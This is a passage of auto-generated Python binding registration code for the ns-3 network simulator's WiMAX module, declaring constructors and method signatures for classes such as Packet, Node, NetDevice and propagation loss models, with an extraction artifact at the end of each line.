cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCi',<\exit>
'void',<\exit>
[param('uint8_t', 'ci')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetEc',<\exit>
'void',<\exit>
[param('uint8_t', 'ec')])<\exit>
cls.add_method('SetEks',<\exit>
'void',<\exit>
[param('uint8_t', 'eks')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
cls.add_method('SetHt',<\exit>
'void',<\exit>
[param('uint8_t', 'HT')])<\exit>
cls.add_method('SetLen',<\exit>
'void',<\exit>
[param('uint16_t', 'len')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('check_hcs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3GrantManagementSubheader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GrantManagementSubheader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPbr',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPm',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSi',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetPbr',<\exit>
'void',<\exit>
[param('uint16_t', 'pbr')])<\exit>
cls.add_method('SetPm',<\exit>
'void',<\exit>
[param('uint8_t', 'pm')])<\exit>
cls.add_method('SetSi',<\exit>
'void',<\exit>
[param('uint8_t', 'si')])<\exit>
return<\exit>
def register_Ns3IpcsClassifier_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IpcsClassifier const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Classify',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'packet'), param('ns3::Ptr< ns3::ServiceFlowManager >', 'sfm'), param('ns3::ServiceFlow::Direction', 'dir')])<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Ipv4AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv4AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv4Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv4MaskChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4MaskChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv4MaskValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4MaskValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv4Mask const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv4Mask const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv6AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv6AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv6Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv6PrefixChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6PrefixChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv6PrefixValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6PrefixValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv6Prefix const &', 'value')])<\exit>
return<\exit>
def register_Ns3LogDistancePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetPathLossExponent',<\exit>
'void',<\exit>
[param('double', 'n')])<\exit>
cls.add_method('GetPathLossExponent',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetReference',<\exit>
'void',<\exit>
[param('double', 'referenceDistance'), param('double', 'referenceLoss')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Mac48AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Mac48AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Mac48Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Mac48Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3MatrixPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLoss',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b'), param('double', 'loss'), param('bool', 'symmetric', default_value='true')])<\exit>
cls.add_method('SetDefaultLoss',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3NakagamiPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3NetDevice_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::NetDevice const &', 'arg0')])<\exit>
cls.add_method('AddLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetAddress',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIfIndex',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMtu',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNode',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBridge',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsLinkUp',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPointToPoint',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('NeedsArp',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Send',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SendFrom',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetAddress',<\exit>
'void',<\exit>
[param('ns3::Address', 'address')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetIfIndex',<\exit>
'void',<\exit>
[param('uint32_t const', 'index')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetMtu',<\exit>
'bool',<\exit>
[param('uint16_t const', 'mtu')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetNode',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetPromiscReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SupportsSendFrom',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3NixVector_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::NixVector const &', 'o')])<\exit>
cls.add_method('AddNeighborIndex',<\exit>
'void',<\exit>
[param('uint32_t', 'newBits'), param('uint32_t', 'numberOfBits')])<\exit>
cls.add_method('BitCount',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 'numberOfNeighbors')],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::NixVector >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint32_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ExtractNeighborIndex',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 'numberOfBits')])<\exit>
cls.add_method('GetRemainingBits',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint32_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Node_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Node const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'systemId')])<\exit>
cls.add_method('AddApplication',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::Application >', 'application')])<\exit>
cls.add_method('AddDevice',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::NetDevice >', 'device')])<\exit>
cls.add_method('ChecksumEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetApplication',<\exit>
'ns3::Ptr< ns3::Application >',<\exit>
[param('uint32_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('GetId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNApplications',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('RegisterDeviceAdditionListener',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])<\exit>
cls.add_method('RegisterProtocolHandler',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler'), param('uint16_t', 'protocolType'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'promiscuous', default_value='false')])<\exit>
cls.add_method('UnregisterDeviceAdditionListener',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])<\exit>
cls.add_method('UnregisterProtocolHandler',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
cls.add_method('DoStart',<\exit>
'void',<\exit>
[],<\exit>
visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ObjectFactoryChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectFactoryChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3ObjectFactoryValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ObjectFactoryValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::ObjectFactory const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::ObjectFactory',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::ObjectFactory const &', 'value')])<\exit>
return<\exit>
def register_Ns3OutputStreamWrapper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::OutputStreamWrapper const &', 'arg0')])<\exit>
cls.add_constructor([param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode')])<\exit>
cls.add_constructor([param('std::ostream *', 'os')])<\exit>
cls.add_method('GetStream',<\exit>
'std::ostream *',<\exit>
[])<\exit>
return<\exit>
def register_Ns3Packet_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Packet const &', 'o')])<\exit>
cls.add_constructor([param('uint32_t', 'size')])<\exit>
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size'), param('bool', 'magic')])<\exit>
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('AddAtEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'packet')])<\exit>
cls.add_method('AddByteTag',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('AddHeader',<\exit>
'void',<\exit>
[param('ns3::Header const &', 'header')])<\exit>
cls.add_method('AddPacketTag',<\exit>
'void',<\exit>
[param('ns3::Tag const &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('AddPaddingAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('AddTrailer',<\exit>
'void',<\exit>
[param('ns3::Trailer const &', 'trailer')])<\exit>
cls.add_method('BeginItem',<\exit>
'ns3::PacketMetadata::ItemIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CopyData',<\exit>
'void',<\exit>
[param('std::ostream *', 'os'), param('uint32_t', 'size')],<\exit>
is_const=True)<\exit>
cls.add_method('CreateFragment',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('uint32_t', 'start'), param('uint32_t', 'length')],<\exit>
is_const=True)<\exit>
cls.add_method('EnableChecking',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('EnablePrinting',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('FindFirstMatchingByteTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('GetByteTagIterator',<\exit>
'ns3::ByteTagIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNixVector',<\exit>
'ns3::Ptr< ns3::NixVector >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketTagIterator',<\exit>
'ns3::PacketTagIterator',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetUid',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('PeekData',<\exit>
'uint8_t const *',<\exit>
[],<\exit>
deprecated=True, is_const=True)<\exit>
cls.add_method('PeekHeader',<\exit>
'uint32_t',<\exit>
[param('ns3::Header &', 'header')],<\exit>
is_const=True)<\exit>
cls.add_method('PeekPacketTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')],<\exit>
is_const=True)<\exit>
cls.add_method('PeekTrailer',<\exit>
'uint32_t',<\exit>
[param('ns3::Trailer &', 'trailer')])<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('PrintByteTags',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('PrintPacketTags',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True)<\exit>
cls.add_method('RemoveAllByteTags',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('RemoveAllPacketTags',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('RemoveAtEnd',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveAtStart',<\exit>
'void',<\exit>
[param('uint32_t', 'size')])<\exit>
cls.add_method('RemoveHeader',<\exit>
'uint32_t',<\exit>
[param('ns3::Header &', 'header')])<\exit>
cls.add_method('RemovePacketTag',<\exit>
'bool',<\exit>
[param('ns3::Tag &', 'tag')])<\exit>
cls.add_method('RemoveTrailer',<\exit>
'uint32_t',<\exit>
[param('ns3::Trailer &', 'trailer')])<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
cls.add_method('SetNixVector',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::NixVector >', 'arg0')])<\exit>
return<\exit>
def register_Ns3RandomVariableChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariableChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3RandomVariableValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::RandomVariableValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::RandomVariable const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::RandomVariable',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::RandomVariable const &', 'value')])<\exit>
return<\exit>
def register_Ns3SimpleOfdmWimaxPhy_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::SimpleOfdmWimaxPhy const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('char *', 'tracesPath')])<\exit>
cls.add_method('ActivateLoss',<\exit>
'void',<\exit>
[param('bool', 'loss')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBandwidth',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNoiseFigure',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPhyType',<\exit>
'ns3::WimaxPhy::PhyType',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTxPower',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('NotifyRxBegin',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyRxDrop',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyRxEnd',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('NotifyTxBegin',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
